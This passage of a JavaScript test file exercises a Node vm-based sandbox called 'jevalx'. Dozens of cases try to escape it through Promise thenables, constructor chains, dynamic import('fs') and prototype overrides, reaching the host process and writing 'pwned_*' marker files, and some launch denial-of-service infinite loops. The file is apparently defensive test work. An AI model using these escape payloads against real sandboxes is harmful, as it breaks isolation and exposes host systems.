       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:1111,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s14:async function(){
let case_id = arguments.callee.name; var code=`
f=m=>m.writeFileSync('pwned_s14','');
import('').then.call=eval.bind(null,"import('fs').then(console.log.call.bind(f.call,f,0))()");
1
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s15:async function(){
let case_id = arguments.callee.name; var code=`
h=console.log;
c=10;
f=async()=>c--==0?h.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s15",""):await{then:h.call.bind(h.call,f,0)}
f();
1
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s16:async function(){
let case_id = arguments.callee.name; var code=`
h=console.log;
c=10;
h.call.bind=h.bind;
f=async()=>c--==0?h.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s16",""):await{then:h.call.bind(h.call,f,0)}
f();
1
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s17:async function(){
let case_id = arguments.callee.name; var code=`
h=console.log;
c=10;
f=async()=>c--==0?h.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s17",""):await{then:[f].map(h.bind,h.call)[0]};
f();
17
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s18:async function(){
let case_id = arguments.callee.name; var code=`
h=console.log;
c=10;
f=async()=>c--==0?h.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s18",""):await{then:[_=>f()].map(h.bind,h.call)[0]}
f();
1
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s19:async function(){
let case_id = arguments.callee.name; var code=`
h=console.log;
c=10;
f=async()=>c--==0?h.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s19",""):await{then:[_=>f()].map(h.bind,h.apply)[0]};
f();
1
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },

s20:async function(){
let case_id = arguments.callee.name; var code=`
f=m=>m.writeFileSync('pwned_s20','');
h=console.log;
import('').then.call=h.bind.call(eval, null,"import('fs').then(h.call.bind(h.call,f,0))");
1
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s21:async function(){
let case_id = arguments.callee.name; var code=`
f=m=>m.writeFileSync('pwned_s21','');
h=console.log;
import('').catch.call=h.bind.call(eval, null,"import('fs').then(h.call.bind(h.call,f,0))");
1
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s22:async function(){
let case_id = arguments.callee.name; var code=`
f=m=>m.writeFileSync('pwned_s21','');
h=console.log;
import('').finally.call=h.bind.call(eval, null,"import('fs').then(h.call.bind(h.call,f,0))");
1
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s23:async function(){
let case_id = arguments.callee.name; var code=`
h=console.log;
c=10;
f=async()=>c--==0?h.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s23",""):await{then:[_=>f()].map(h.bind,h.apply)[0]}
f();
throw 1;
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s24:async function(){
let case_id = arguments.callee.name; var code=`
h=console.log;
c=10;
import('').catch.call=1;
f=async()=>c--==0?h.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s24",""):await{then:[_=>f()].map(h.bind,h.apply)[0]}
f();
throw 1;
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s25:async function(){
let case_id = arguments.callee.name; var code=`
h=console.log;
c=10;
import('').then.call=1;
f=async()=>c--==0?h.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s25",""):await{then:[_=>f()].map(h.bind,h.apply)[0]}
f();
throw 1;
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s26:async function(){
let case_id = arguments.callee.name; var code=`
g=m=>m.writeFileSync('pwned_s26','');
h=console.log;
c=10;
f=async()=>c--==0?(import('').then.call=h.bind.call(eval, null,"import('fs').then(h.call.bind(h.call,g,0))")):await{then:[_=>f()].map(h.bind,h.apply)[0]}
f();
1
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s27:async function(){
let case_id = arguments.callee.name; var code=`
throw{get code(){try{console.log.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s27","")}catch{throw this}}}
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s28:async function(){
let case_id = arguments.callee.name; var code=`
throw((a=[1]).map=_=>a[0]-->0?a:{get code(){console.log.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s28","")}},a);
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s29:async function(){
let case_id = arguments.callee.name; var code=`
h=console.log;
(a=[1]).map=_=>a;
x=h.call.bind(a.then=r=>{
	a.then=1;
	r(a);
	try{console.log.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s29","")}catch{a.then=x}
},0);
a
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s30:async function(){
let case_id = arguments.callee.name; var code=`
h=console.log;
h.call.bind=h.bind;
(a=[1]).map=_=>a;
x=h.call.bind(a.then=r=>{
	a.then=1;
	r(a);
	try{console.log.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s30","")}catch{a.then=x}
},0);
a
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s31:async function(){
let case_id = arguments.callee.name; var code=`

h=console.log;
(a=[1]).map=_=>a;
a.then=r=>(x=[(_,r)=>{
	console.log(_, r);
	a.then=1;
	r(a);
	try{console.log.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s31","")}catch{a.then=x}
}].map(h.bind,h.call)[0])(r);
a
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
s32:async function(){
let case_id = arguments.callee.name; var code=`
h=console.log;
Array.prototype.push=function(){this.then=r=>(x=[(_,r)=>{
	this.then=1;
	r(this);
	try{console.log.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_s32","")}catch{this.then=x}
}].map(h.bind,h.call)[0])(r)};
[1]
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },



tpl:async function(){
let case_id = arguments.callee.name; var code=`
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },


//////////////////////
  x1:async function(){ let case_id = arguments.callee.name; var code=`
const i = import('');
//console.log('i='+typeof i);
//delete i.prototype;
//console.log('i.prototype='+typeof i.prototype);
//console.log('i.constructor='+i.constructor);
//console.log('i.constructor.race='+i.constructor.race);
//delete i.constructor;
console.log('i.constructor='+typeof (i.constructor));
i.constructor.__proto__.call = [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["import('fs').then(m=>m.writeFileSync('pwned_x1', ''))"]));
console.log('i.constructor.__proto__'+i.constructor.__proto__)
i.catch();
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },

  x2:async function(){ let case_id = arguments.callee.name; var code=`
Promise.delay(999).then(()=>{const i=import("");console.log('x2.i'+i.constructor.constructor("return process")())})
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },

x3:async function(){
let case_id = arguments.callee.name; var code=`
(async()=>110031)().then(r=>{throw({r})});
(async()=>110032)().then(async(r)=>{
  let loop=1;
  while(true)
  {
    //console.log('x3',loop,new Date());
    try {
      import('').catch(_=>_).constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_x3",""+loop);
      console.log('x3yes?',loop)
    } catch (e) {
      //console.log('x3.e',e)
    }
    loop++;
  }
});
11003
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666}));
       //console.log(`${case_id} result(raw)=`,await jevalx_raw(code,require('vm').createContext({console}),111));//TMP TEST
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
},

//DDOS(denial of service attack) + escape
x4:async function(){ let case_id = arguments.callee.name; var code=`
(async()=>11004)().then(async(r)=>{
  let loop=1;
  while(true)
  {
    //console.log('x4',loop,new Date());
    try {
      import('').catch(_=>_).constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_x4",""+loop);
      console.log('x4yes?',loop)
    } catch (e) {
      //console.log('x4.e',e)
    }
    //await Promise.delay(111);
    //await Promise.resolve();//
    //await 0;
    //await (async()=>0)();//
    loop++;
  }
});
11004
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666}));
       //console.log(`${case_id} result(raw)=`,await jevalx_raw(code,require('vm').createContext({console}),111));//TMP TEST
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
},
x5:async function(){ let case_id = arguments.callee.name; var code=`
(async()=>{ await delay(1234); return [1,2]})()
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{delay},{microtaskMode:false,timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },

//pure dead loop
x6:async function(){
let case_id = arguments.callee.name; var code=`

h=console.log;
f=async()=>{try{
console.log('cc',new Date());
throw 999
}catch(e){
console.log('dd',new Date());
await{then:h.call.bind(f.call,f,0)}
}}
f();
1

`
     try{
//NOTES: microtaskMode:'afterEvaluate' no use for this deadloop 
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
       //console.log(`${case_id} result(raw)=`,await jevalx(code,{},{microtaskMode:'false',timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },

//"Error: async hook stack has become corrupted"
x7:async function(){
let case_id = arguments.callee.name; var code=`
//(f=async()=>{try{throw 1}catch(e){await{then:f}}})()
//(f=async()=>{try{console.log(new Date());import('fs').then(m=>m.writeFileSync("pwned_x7",""))}catch(e){await{then:f}}})()
//(f=async()=>{try{console.log(new Date());eval("import('fs').then(m=>m.writeFileSync('pwned_x7',''))")}catch(e){await{then:f}}})()
f=async()=>{try{console.log(new Date());eval("import('fs').then(m=>m.writeFileSync('pwned_x7',''))")}catch(e){await{then:f}}}
f()
1
`
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
x8:async function(){
let case_id = arguments.callee.name; var code=`
(async()=>await tmp)()
`;
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{tmp:(async()=>Math.random())()},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
//concept proved...
//     try{
//       console.log(`${case_id} (!microtaskMode) result(raw)=`,await jevalx(code,{tmp:(async()=>1)()},{timeout:666,json_output:false,microtaskMode:''}));
//     }catch(ex){
//       console.log(`${case_id} ex=`,ex);
//     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },

x9:async function(){
let case_id = arguments.callee.name; var code=`
(async()=>await tmp())()
`;
     try{
       console.log(`${case_id} result(raw)=`,await jevalx(code,{tmp:(async()=>Math.random())},{timeout:666,json_output:false}));
     }catch(ex){
       console.log(`${case_id} ex=`,ex);
     }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },


LAST:(async()=>{ //normal case:

  //try{
  //  assert.equal( 8 , await jevalx('x**y',{x:2,y:3}))
  //  console.log('ASSERT 8 == x**y',true);
  //}catch(ex){
  //  console.log('ASSERT 8 == x**y',ex);
  //}
  //assertWtf.equal( 8 , await jevalx('x**y',{x:2,y:3}) );
  console.log('ASSERT 8 == x**y',await jevalx('x**y',{x:2,y:3}));
  console.log('ASSERT 81 == x**y',await jevalx('(async()=>(x**y))()',{x:3,y:4}));
  //assertWtf.equal( 81 , await jevalx('x**y',{x:3,y:4}) );
  console.log('ASSERT 8, ()=>x**y',await jevalx('()=>x**y',{x:2,y:3}));
  console.log('ASSERT [2,3], ()=>x**y',await jevalx('()=>[x,y]',{x:2,y:3}));

  console.log('ASSERT 19683 == new Promise(r=>r(x**y**z))',await jevalx('new Promise(r=>r(x**y**z))',{x:3,y:3,z:2}));

  //JSON.parse(await jevalx(`({t:new Date()})`,{},{json_output:true}))
  console.log(`TEST json output`,await jevalx('({t:new Date()})',{},{timeout:666,json_output:true}));

  //console.log('ASSERT undefined == process:',await jevalx('[].constructor.constructor("return typeof(process)")()'));

  //console.log('check "this"',await jevalx('[this,2**3]'));
  console.log('ASSERT 3 == await jevalx(`++this.rst`,{rst:2},666)',await jevalx(`++this.rst`,{rst:2}));
  console.log("ASSERT object,function', typeof(process),typeof(Promise) =",typeof(process),typeof(Promise));
  console.log('Object',Object);
  console.log('Promise',Promise);
  console.log('Proxy',Proxy);
  console.log('Error',Error);
  console.log('require',typeof require);
  console.log('Array.prototype.push',Array.prototype.push);

  //console.log('tmp',await jevalx(` const hostGlobal = this.constructor.constructor("return this")(); hostGlobal.__proto__.__defineGetter__ `));
  //console.log('tmp',await jevalx(`void(async()=>{throw 911})()`));
  // quick testing return a function that hacks:

  // core doesn't pass the ddos-alike codes:
  try{ console.log('deadloop',await jevalx(`(async()=>{while(1);})`)) }catch(ex){ console.log('deadloop.ex',ex); }

  //try{ console.log('deadloop2',await jevalx(`(async()=>{let lp=1;while(1){console.log(lp++,new Date());await Promise.resolve(11)};})();true`)) }catch(ex){ console.log('deadloop2.ex',ex); }

  //try{ console.log('deadloop3a',await jevalx(`(async()=>{let lp=1;while(lp){console.error(lp++,new Date());};})();true`)) }catch(ex){ console.log('deadloop3a.ex',ex); }

  //{microtaskMode: 'afterEvaluate'} !!
  //try{ console.log('deadloop3a',await jevalx_raw(`(async()=>{let lp=1;while(lp){console.error('deadloop3a',lp++,new Date());await lp};})();true`,require('vm').createContext({console},{microtaskMode: 'afterEvaluate'}),666)) }catch(ex){ console.log('deadloop3a.ex',ex); }

  //try{ console.log('deadloop3a',await jevalx(`(async()=>{let lp=1;while(lp){console.error(lp++,new Date());await 0};})();true`)) }catch(ex){ console.log('deadloop3a.ex',ex); }

  //TODO
  //try{ console.log('deadloop3',await jevalx(`(async()=>{let lp=1;while(lp){console.error(lp++,new Date());await (async()=>0)()};})();true`)) }catch(ex){ console.log('deadloop3.ex',ex); }

  //try{ console.log('deadloop4',await jevalx(`(async()=>{let lp=1;while(1){console.log(lp++,new Date())}})();true`)) }catch(ex){ console.log('deadloop4.ex',ex)}
  //try{ console.log('deadloop4',await jevalx(`(async()=>{let lp=1;while(1){console.log(lp++)}})();true`,{console:{log:()=>{}}},999)) }catch(ex){ console.log('deadloop4.ex',ex)}//TMP OK
/*
  try{ console.log('deadloop4',await jevalx(`(async()=>{let lp=1;while(1){console.error('deadloop4',lp++)}})();true`,{console:{
//log:console.log
error:console.error,
log(...args){
  console.error(...args) //wtf, the log() has bug then error ????
}
}},999)) }catch(ex){ console.log('deadloop4.ex',ex)}
*/
}),

}

if (require.main === module) {
  console.log('commmand line:',argo);
  (async()=>{
    let test_cases = require('./test');
    //console.log('test_cases',test_cases);
    let case_id = argo.case;
    if (case_id) {
      //process.on('unhandledRejection', (reason, promise) => { console.error('!!!! =======> unhandledRejection', promise, 'reason:', reason); });
      console.log(`-------------- test case ${case_id} ---------------`);
      for (let k of case_id.split(',')){
        console.log(`-------------- test ${k} start---------------`);
        await test_cases[k]();
      }
    }else{
      console.log('-------------- test all start ---------------');
      for (let k in test_cases){
        console.log(`-------------- test ${k} start---------------`);
        await test_cases[k]();
        console.log(`-------------- test ${k} end ---------------`);
      }
    }
console.log('-------------- test pwn* ---------------');
await searchFiles('.',/^pwn/);
  })().then(()=>{
    console.log('command line:',argo,'VER:',jevalxModule.VER);
  }).catch(ex=>{
    console.log('!!!!!!!!!!! main.catch.ex',ex);
  })
}
/**
e.g..
node test /case=q7
or for all
node test 

*/


/**

quick notes

The difference between `__proto__` and `prototype` is simple: `__proto__` is a property of an object instance, while `prototype` is a property of a constructor function.
When you use `__proto__`, you're looking up properties and methods on an object's prototype chain. On the other hand, `prototype` defines the shared properties and methods that all instances created from a constructor function will have.

__proto__ almost is getPrototypeOf() but sometime not exactly...same... most pollution came from there.

console.log(getAllPrototypeMethods(constructor));

old helper.
//const S_FUNCTION = "(...args)=>eval(`(${args.slice(0,-1).join(',')})=>{${args[args.length-1]}}`)";

    //js_opts=({async importModuleDynamically(specifier, referrer, importAttributes){
    //  if (!evil && !err){
    //    if (user_import_handler) { return user_import_handler({specifier, referrer, importAttributes}) }
    //    if (specifier=='fs'){ return import(`./fake${specifier||""}.mjs`) }
    //  }
    //  evil++; err = {message:'EvilImport',js};
    //  throw('EvilImport');
    //}});

await jevalx(`dumptree(this)`,{dumptree:require('./dumptree')})
Object.defineProperty(globalThis,'AsyncFunction',{value:(async()=>{}).constructor,writable:false,enumerable:false,configurable:false});// TOOL

*/

/**
TODO
var {delay,jevalx,jevalx_raw} = require('./jevalx');
await jevalx_raw(`(async()=>{await delay(1111);return 1})()`,vm.createContext({delay}))[1]
*/

